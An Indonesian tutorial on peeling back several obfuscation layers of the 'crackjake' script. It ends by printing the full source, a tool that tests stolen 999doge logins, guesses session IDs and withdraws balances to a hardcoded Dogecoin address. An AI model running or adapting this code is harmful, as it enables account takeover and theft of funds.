# Dekripsi Script Crackjake


## Pendahuluan

Tutorial kali ini akan membahas cara men-deobfuscate dan melakukan dekripsi terhadap script [crackjake](https://github.com/layscape/crackjake). Pada prinsipnya, cara yang digunakan pada tutorial ini dapat juga diaplikasikan pada script [999doge](https://github.com/layscape/999doge).


## Langkah-langkah

* Pertama kita kloning terlebih dahulu repositori script tersebut:

```bash
% git clone https://github.com/layscape/crackjake
```

* Setelah proses kloning selesai, pindah ke subdirektorinya:

```bash
% cd crackjake
```

* Periksa tipe file **botcrack.py**. Langkah ini sifatnya opsional:

```bash
% file botcrack.py
botcrack.py: ASCII text, with very long lines, with CRLF line terminators
```

* Buka file **botcrack.py** menggunakan text editor, isinya kurang lebih seperti ini:

```python
import marshal,zlib,base64
exec(zlib.decompress(base64.b16decode("789C249BC7B2 ... 7F014EF4D954")))
```

* Ganti fungsi `exec` menjadi `print` sehingga seperti ini:

```python
import marshal,zlib,base64
print(zlib.decompress(base64.b16decode("789C249BC7B2 ... 7F014EF4D954")))
```

* Jalankan script **botcrack.py** tersebut, dan simpan hasilnya ke file sementara, lalu ubah nama file sementara tersebut menjadi **botcrack.py**:

```bash
% python3 botcrack.py > tmp && mv -f tmp botcrack.py
```

* Hasilnya kurang lebih seperti ini:

```python
b'#Encrypt by Sumarr ID\n#Gitlab : Https://gitlab.com/Sumarr-ID\nimport marshal,zlib,base64\nexec(zlib.decompress(base64.b64decode("eJztms2uNclxXcf ... Y3v/oP/wf1dYjb")))'
```

* Perbaiki _formatting_ file tersebut agar mudah dibaca seperti ini:

```python
#Encrypt by Sumarr ID
#Gitlab : Https://gitlab.com/Sumarr-ID
import marshal,zlib,base64
exec(zlib.decompress(base64.b64decode("eJztms2uNclxXcf ... Y3v/oP/wf1dYjb")))
```

* Ganti `exec` pada script tersebut menjadi `print` sehingga menjadi seperti ini:

```python
#Encrypt by Sumarr ID
#Gitlab : Https://gitlab.com/Sumarr-ID
import marshal,zlib,base64
print(zlib.decompress(base64.b64decode("eJztms2uNclxXcf ... Y3v/oP/wf1dYjb")))
```

* Seperti beberapa langkah sebelumnya, jalankan script tersebut, simpan hasilnya pada file sementara lalu ubah nama file sementara tersebut menjadi **botcrack.py** menimpa file aslinya:

```bash
% python3 botcrack.py > tmp && mv -f tmp botcrack.py
```

* Hasilnya kurang lebih seperti ini:

```python
b'\n# coding=utf-8\n# obfuscated with plusobf: https://github.com/loolzec/plusobf\n\n\n\nd=[\'+++++++++++++++++++++++++++++++++++\', ... \'+++++++++++++++++++++++++++++++++++++++++\'];exec("".join([chr(len(i)) for i in d]))\n\t'
```

* Kita perlu memperbaiki _formatting_ file tersebut menggunakan perintah berikut:

```bash
% echo -ne $(cat botcrack.py) > tmp && mv -f tmp botcrack.py
% sed -i 's/\\//g' botcrack.py
% sed -i 's/exec/print/' botcrack.py
```

* Hasilnya menjadi seperti ini:

```python
# coding=utf-8
# obfuscated with plusobf: https://github.com/loolzec/plusobf

d=['+++++++++++++++++++++++++++++++++++',
  ...
'+++++++++++++++++++++++++++++++++++++++++'];print("".join([chr(len(i)) for i in d]))
```

* Jalankan script tersebut dan simpan hasilnya pada file sementara, lalu ubah namanya menjadi **botcrack.py**:

```bash
% python3 botcrack.py > tmp && mv -f tmp botcrack.py
```

* Hasilnya seperti ini:

```python
#Encrypt by Sumarr ID
#Gitlab : Https://gitlab.com/Sumarr-ID
import marshal,zlib,base64
exec(zlib.decompress(base64.b64decode("eJzNe11z20iy5bt ... NxNoZd4=")))
```

* Ganti `exec` menjadi `print` lalu jalankan script tersebut:

```bash
% sed -i 's/exec/print/' botcrack.py && python3 botcrack.py > tmp && mv -f tmp botcrack.py
```

* Hasilnya adalah script dengan _formatting_ yang tidak teratur seperti ini:

```python
b'####    How To Open This Script?    ####\n###     Use unlock Function
...
if "__main__" == __name__:\n   unlock(req.text)\n'
```

* Perbaiki _formatting_ file tersebut sehingga dapat mudah dibaca seperti ini:

```python
####    How To Open This Script?    ####
###     Use unlock Function         ####
import getpass,hashlib,base64, cloudscraper
def hasher(text,length,key):
    if length > 64:
       raise ValueError("hash length should be lower than 64")
    result = hashlib.sha256(text.encode("utf-8")+key.encode("utf8")+text.encode("utf8")).hexdigest()[:length][::-1]
    return result #return final result


def separator(text,length):
    return [text[i:i+length] for i in range(0,len(text),int(length))]

def decrypt(text,key):
    textsplit = text.split("!-!")
    encrypted,shuffled,hash_length,separate_length = textsplit[0].split("|")
    encrypted = separator(encrypted,int(hash_length))
    encrypted2 = separator("".join(encrypted),int(hash_length))
    shuffled = separator(shuffled,int(separate_length))
    primary_key_is_true = True
    for i in shuffled:
        hashed = hasher(i,int(hash_length),key)
        if hashed in encrypted:
           encrypted[encrypted.index(hashed)] = i

    for i in encrypted:
        if i in encrypted2 and len(textsplit) == 1:
           raise KeyError("Wrong Key")
        elif i in encrypted2:
           primary_key_is_true = False
           break

    if primary_key_is_true:
       result = base64.b64decode("".join(encrypted)[::-1])

    if len(textsplit) >= 2 and primary_key_is_true == False:
       master_key = separator(textsplit[1],int(hash_length))
       master_key2 = separator("".join(master_key),int(hash_length))
       for i in shuffled:
           hashed = hasher(i,int(hash_length),key)
           if hashed in master_key:
              master_key[master_key.index(hashed)] = i

       for i in master_key:
           if i in master_key2:
              raise KeyError("Wrong Key")
       result = base64.b64decode("".join(master_key)[::-1])
    return result

def unlock(key):
    exec (decrypt("fd355f2f319d ... d3952cfea88f",key),globals())

scr = cloudscraper.create_scraper()
data = {
  "session":"M0erssadMlkasd12391MsadlsadSAmxadw"
}
req = scr.post('http://layscape.xyz/crackjake/enc.php',data=data)
if "__main__" == __name__:
   unlock(req.text)
```

* Bisa terlihat bahwa script tersebut akan mengirimkan request ke tautan `http://layscape.xyz/crackjake/enc.php` dengan mengirimkan kode _session_ untuk memperoleh _key_ yang dapat digunakan untuk dekripsi _string_ yang terdapat pada fungsi `unlock`. Kita dapat menggunakan [HTTPie](https://httpie.org/) atau [curl](https://curl.haxx.se/) untuk mendapatkan _key_ tersebut seperti ini:

```bash
% curl -d "session=M0erssadMlkasd12391MsadlsadSAmxadw" "http://layscape.xyz/crackjake/enc.php"
ASd412sd23sdaodwldasasmcamsmdwadMsua2131sadu
```

* Respon dari server berupa _string_ `ASd412sd23sdaodwldasasmcamsmdwadMsua2131sadu` adalah key yang dapat digunakan untuk melakukan unlocking script tersebut. Edit file **botcrack.py** karena kita tidak memerlukan modul **cloudscraper** dan ganti fungsi `exec` menjadi `print` pada fungsi `unlock` sehingga menjadi seperti ini:

```python
####    How To Open This Script?    ####
###     Use unlock Function         ####
import getpass,hashlib,base64
def hasher(text,length,key):
    if length > 64:
       raise ValueError("hash length should be lower than 64")
    result = hashlib.sha256(text.encode("utf-8")+key.encode("utf8")+text.encode("utf8")).hexdigest()[:length][::-1]
    return result #return final result


def separator(text,length):
    return [text[i:i+length] for i in range(0,len(text),int(length))]

def decrypt(text,key):
    textsplit = text.split("!-!")
    encrypted,shuffled,hash_length,separate_length = textsplit[0].split("|")
    encrypted = separator(encrypted,int(hash_length))
    encrypted2 = separator("".join(encrypted),int(hash_length))
    shuffled = separator(shuffled,int(separate_length))
    primary_key_is_true = True
    for i in shuffled:
        hashed = hasher(i,int(hash_length),key)
        if hashed in encrypted:
           encrypted[encrypted.index(hashed)] = i

    for i in encrypted:
        if i in encrypted2 and len(textsplit) == 1:
           raise KeyError("Wrong Key")
        elif i in encrypted2:
           primary_key_is_true = False
           break

    if primary_key_is_true:
       result = base64.b64decode("".join(encrypted)[::-1])

    if len(textsplit) >= 2 and primary_key_is_true == False:
       master_key = separator(textsplit[1],int(hash_length))
       master_key2 = separator("".join(master_key),int(hash_length))
       for i in shuffled:
           hashed = hasher(i,int(hash_length),key)
           if hashed in master_key:
              master_key[master_key.index(hashed)] = i

       for i in master_key:
           if i in master_key2:
              raise KeyError("Wrong Key")
       result = base64.b64decode("".join(master_key)[::-1])
    return result

def unlock(key):
    print(decrypt("fd355f2f319d ... d3952cfea88f",key),globals())

unlock('ASd412sd23sdaodwldasasmcamsmdwadMsua2131sadu')
```

* Jalankan script tersebut dan simpan hasilnya pada file sementara, lalu pindahkan file sementara tersebut kembali ke file **botcrack.py**:

```bash
% python3 botcrack.py > tmp && mv -f tmp botcrack.py
```

* Hasilnya kurang lebih seperti ini:

```python
b"import base64\nexec(base64.b64decode('=oQKolGd1B3KikWYzVGb ... bsNGI0J3bw1Wa'[::-1]))" {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f101462f040>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'botcrack.py', '__cached__': None, 'getpass': <module 'getpass' from '/usr/lib64/python3.8/getpass.py'>, 'hashlib': <module 'hashlib' from '/usr/lib64/python3.8/hashlib.py'>, 'base64': <module 'base64' from '/usr/lib64/python3.8/base64.py'>, 'hasher': <function hasher at 0x7f101465c3a0>, 'separator': <function separator at 0x7f1014199790>, 'decrypt': <function decrypt at 0x7f1014199820>, 'unlock': <function unlock at 0x7f10141998b0>}
```

* Edit file tersebut dan ganti fungsi `exec` menjadi fungsi `print` sehingga menjadi seperti ini:

```python
import base64
print(base64.b64decode('=oQKolGd1B3KikWYzVGb ... bsNGI0J3bw1Wa'[::-1]))
```

* Jalankan script tersebut dengan menggunakan `echo` untuk memperbaiki _formatting_ lalu simpan pada file sementara dan pindahkan file sementara tersebut kembali ke file **botcrack.py**:

```bash
% echo -ne $(python3 botcrack.py) > tmp && mv -f tmp botcrack.py
```

* Hasilnya adalah file asli **botcrack.py** berikut ini:

```python
import cloudscraper, random, time, sys, os

gen = "abcdef0123456789"
grator = lambda lenght:[random.choice(gen) for i in range (lenght)]
birutua = "\033[0;34m"
putih = "\033[0m"
kuning = "\033[1;33m"
hijau = "\033[1;32m"
merah = "\033[1;31m"
biru = "\033[0;36m"
ungu = "\033[1;35m"
headers = {
"user-agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.93 Mobile Safari/537.36",
"content-type": "application/x-www-form-urlencoded",
"accept": "/",
"x-requested-with": "com.reland.relandicebot",
"sec-fetch-site": "cross-site",
"sec-fetch-mode": "cors",
"accept-encoding": "gzip, deflate",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"cookie": "lang=id"
}

url_login = 'https://www.999doge.com/api/web.aspx'
scr = cloudscraper.create_scraper()
go = 0
def checklist():
    login = 'a=Login&Key=e46b7c63f6b647e0bed15b38238700d5&Username='+user+'&Password='+password+'&Totp='
    logins = scr.post(url_login, data=login, headers=headers).json()
    try:
        ses = logins['SessionCookie']
        refer = logins['ReferredById']
        dogebalance = logins['Doge']['Balance'] / 100000000
        accid = logins['AccountId']
        print(hijau+"ALIVE :",user,password+putih)
    except Exception as e:
        print(merah+"DIE :",user,password+putih)
    time.sleep(3)
def checkbalance():
    a = grator(rand)
    session = ''.join([str(elem) for elem in a])
    print(hijau,"-----Generate Data Account-----",end="\r")
    time.sleep(1)
    check_balance = 'a=GetBalance&s='+session+'&Currency=doge'
    print(hijau,"-----Requesting to Server-----",end="\r")
    time.sleep(1)
    check_balance1 = scr.post(url_login, data=check_balance, headers=headers).json()
    balance = 0
    try:
        balance= check_balance1['Balance']
        print(hijau,"'------------[ALIVE]------------'")
        print(hijau,"Withdrawing",putih)
        global scs
        scs += 1
    except:
        print(merah,"'------------[DIE]------------'")
        global tt
        tt += 1
    if balance >= 1:
        withdraw(balance)
    else:
        pass
def withdraw(balance):
    wd_amount = int(balance)
    jum1_wd = wd_amount / 100000000
    address = "DSQBo4tCDuGLRKaW2Sur4XPk25r7d1C6dm"
    withdraw = 'a=Withdraw&s='+session+'&Amount='+str(wd_amount)+'&Address='+address+'&Totp=&Currency=doge'
    wd = scr.post(url_login, data=withdraw, headers=headers).json()
    print("Successfull Withdraw :",jum1_wd,"DOGE")
    Successfull += 1
    return Successfull
tt = 0
scs = 0
try:
    os.system('clear')
    info = scr.get("https://layscape.xyz/crackjake/info.php", timeout=10).json()
    print(hijau,"Successfull Get Server Information")
    time.sleep(2)
    os.system('clear')
except Exception as e:
    print(merah+"Can't Connect To Layscape Server to Get Information Script. Try Again"+putih)
    print(merah+"1. Maybe Server Down"+putih)
    print(merah+"2. Try Update New Script"+putih)
    print(e)
    sys.exit()

version = info['versi']
print("\033[1;31m====================================================\033[0m")
print("\033[1;32m[+]\033[0m \033[0;36mDO WITH YOUR OWN RISK \033[0m \033[1;32m[+]\033[0m")
print("\033[1;32m[+]\033[0m \033[1;33mCreator : Layscape\033[0m \033[1;32m[+]\033[0m")
print("\033[1;32m[+]\033[0m \033[1;33mVersi Script V2.0\033[0m \033[1;32m[+]\033[0m")
print("\033[1;32m[+]\033[0m \033[1;33mJoin Group Whatsapp For News and Update\033[0m \033[1;32m[+]\033[0m")
print("\033[1;31m====================================================\033[0m")
print("Disclaimer : \nScript Not Working Don't Blame Creator :). \nRead/Watch How to Use As Well")
print("\033[1;31m====================================================\033[0m")
print(kuning+"Info :"+info['notice5']+putih)
print("\033[1;31m====================================================\033[0m")
print(hijau+"Information Script :")
print("Versi :",info['versi'])
print("Creator :", info['created'])
print("Youtube :", info['youtube'])
print("Script :", info['script']+putih)
if "2.0" == version:
    print(hijau+"Latest Version"+putih)
else:
    print(merah+"Old Version Go Update This Script"+putih)
    sys.exit()
print(birutua+"Perlu Diingat Bahwa")
print(kuning+"1. Perlu kehokian, karena sifat script checker bukan hacking/phising")
print("2. Kalau Statusnya Alive semua balance di akun tersebut akan")
print("Ditransfer ke wallet")
print("3. Versi Premium dalam tahap pengembangan")
print("4. Belum Support Multi Currency, Doge Only",putih)
print("\n Ambil Key di http://bit.ly/layscapecrackjake")
key = input(kuning+"Masukan Key Untuk Membuka Script : "+putih)
reqkey = scr.post('http://layscape.xyz/crackjake/keycrackjake.php', data={'key':key}).json()
if reqkey['status'] == 'LayscapeKumaru@@2012#*#*':
    print(hijau+"Unlocked"+putih)
    pass
else:
    print(merah+"Key Salah"+putih)
    sys.exit()
address = input("Masukan Wallet Dogecoin :")
print(hijau+"Alive = Akun Ditemukan")
print(merah+"Die = Akun 0 Balance atau salah"+putih)
print(kuning+"Pilih Algorithm :")
print("[1] 32-bit SHA-256 HEX")
print("[2] 33-bit SHA-256 HEX")
print("[3] Checker list.txt")
menu = input("==>")
if menu == '1':
    rand = 32
    while True:
        checkbalance()
        print(kuning+"Total Account Checked",putih+"["+merah+str(tt)+putih+"]","["+hijau+str(scs)+putih+"]", end="\r")
        time.sleep(5)
elif menu == '2':
    rand = 33
    while True:
        checkbalance()
        print(kuning+"Total Account Checked",putih+"["+merah+str(tt)+putih+"]","["+hijau+str(scs)+putih+"]", end="\r")
        time.sleep(5)
elif menu == '3':
    a = 0
    read = open("list.txt")
    op = read.read()
    b = op.count(':')
    print("Data ditemukan :",b)
    while a < b:
        try:
            splines = op.splitlines()
            newstr = splines[a]
            split = newstr.split(':')
            user = split[0]
            password = split[1]
        except Exception as e:
            print(e)
        checklist()
        a += 1
    else:
        print(hijau+"Check Akun Selesai"+putih)
```

* Seperti yang terdapat pada bagian awal tutorial ini, langkah-langkah di atas dapat pula digunakan untuk melakukan dekripsi dan deobfuscate terhadap script [999doge](https://github.com/layscape/999doge).


## Penutup

Sekian tutorial singkat kali ini, semoga bermanfaat. Terima kasih kepada Allah SWT, dan Anda yang telah membaca tutorial ini.
